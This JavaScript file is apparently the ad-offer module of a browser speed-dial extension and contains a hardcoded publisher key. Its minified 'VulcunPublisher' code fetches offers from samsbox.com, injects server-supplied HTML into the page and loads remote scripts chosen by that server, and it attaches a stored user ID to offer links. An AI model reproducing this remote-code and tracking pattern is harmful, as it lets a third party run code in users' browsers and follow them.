var path = "https://samsbox.com/";

var params = {
    "publisherId"    : "32",
    "publisherKey"   : "481e7b497ddba9bf3c2a5b651bcff1ed1a00136a",
    "publisherName"  : "1",
    "addOfferScript" : true,
    "addStoreScript" : true,
};

/*
 * stores:
 * playstore
 * appstore 
 * 
 * 
 */

VulcunAd = {
  setStore: function(storeName, cb) {
    chrome.storage.sync.set({vulcun_store_name: storeName}, function() {
      cb();
    });
  },
  _waitForTheUserId: function(cb) {
    var maxWaits = 20,
        waits = 0;
    var interval = setInterval(function() {
      waits++;
      if(waits >= maxWaits) {
        clearInterval(interval);
        return cb();
      }
      chrome.storage.sync.get("vulcun_user_id", function(res) {
        if(res && res.vulcun_user_id) {
          clearInterval(interval);
          return cb();
        }
      });
    }, 1000);
  },
  loadOffers: function(cb) {
    var self = this;
    VulcunPublisher.init(function(offers) {
      self._waitForTheUserId(function() {
        chrome.storage.sync.get(null, function(vulcunSettings) {
          if(!vulcunSettings.vulcun_user_id) {
            // ignore offers addition, coz userId not in database
            return;
          }
          var result = [];
          offers.forEach(function(offer) {
            try {
              var title = offer.name,
                  url = offer.redirect,
                  img = offer.images[0].img_name,
                  dialData = {};
              // add store and userId settings
              url += "&userId="+encodeURIComponent(vulcunSettings.vulcun_user_id);   
              url += "&store="+encodeURIComponent(vulcunSettings.vulcun_store_name);
              dialData.url = url;
              dialData.thumb_source_type = "url";    
              dialData.thumb_url = img;
              dialData.title = title;
              result.push(dialData);         
            }
            catch(ex) {
              next();
            }            
          });
          return cb(result);
          /*old*/
         /*
          var countOffersAdded = 0;
          fvdSpeedDial.Storage.groupIdByGlobalId("default", function(groupId) {
            fvdSpeedDial.Utils.Async.arrayProcess(offers, function(offer, next) {
              if(countOffersAdded >= 3) {
                return next();
              }
              try {
                var title = offer.name,
                    url = offer.redirect,
                    img = offer.images[0].img_name,
                    dialData = {};
                // add store and userId settings
                url += "&userId="+encodeURIComponent(vulcunSettings.vulcun_user_id);   
                url += "&store="+encodeURIComponent(vulcunSettings.vulcun_store_name);
                dialData.url = url;
                dialData.thumb_source_type = "url";    
                dialData.thumb_url = img;
                dialData.title = title;
                dialData.group_id = groupId;
                countOffersAdded++;
                fvdSpeedDial.Storage.addDial( dialData, function( res ){
                  if( dialData.thumb_source_type == "url" ){
                    fvdSpeedDial.ThumbMaker.getImageDataPath(dialData.thumb_url, fvdSpeedDial.SpeedDial.getMaxCellWidth(), function(dataUrl, thumbSize){
                      fvdSpeedDial.Storage.updateDial( res.id, {
                        thumb: dataUrl,
                        thumb_width: Math.round( thumbSize.width ),
                        thumb_height: Math.round( thumbSize.height )
                      }, function(){
                        next();
                      } );
                    });
                  }
                  else {
                    next();
                  }
                });
              }
              catch(ex) {
                next();
              }
            }, function() {
              fvdSpeedDial.SpeedDial.sheduleRebuild();
            });
          });
          */
        });
      });  
    });
  }
};
  
     
var VulcunPublisher={publisherParams:params,getAPILink:function(){var e=path+"getOffers?responseType=json&publisherId="+VulcunPublisher.publisherParams.publisherId;e+="&publisherKey="+VulcunPublisher.publisherParams.publisherKey;return e},tracking:path+"scripts/publisher/store.min.js",getResources:function(e,t,n){$.ajax({url:e,dataType:"json",success:function(e){if(t!=null)t(e)},failure:function(e){if(n!=null)n(e)}})},loadScript:function(e,t,n){$.get(e[t],function(e){n(t)})},getData:function(e,t){chrome.storage.sync.get(e,function(e){if(t!=null)t(e)})},init:function(e){if(VulcunPublisher.publisherParams.addStoreScript==true){VulcunPublisher.loadScript([VulcunPublisher.tracking],0,function(){})}if(VulcunPublisher.publisherParams.addOfferScript==true){VulcunPublisher.getData("vulcun_store_name",function(t){var n=t.vulcun_store_name||"";var r=VulcunPublisher.getAPILink()+"&store="+n;VulcunPublisher.getResources(r,function(t){if(t.success==1){$("body").append(t.data.modal);VulcunPublisher.loadScript([t.data.clientjs],0,function(){});if(e!=null){e(t.data.offers)}return}console.log("Error : "+t.message)},function(e){console.log("Error : "+e)})})}}};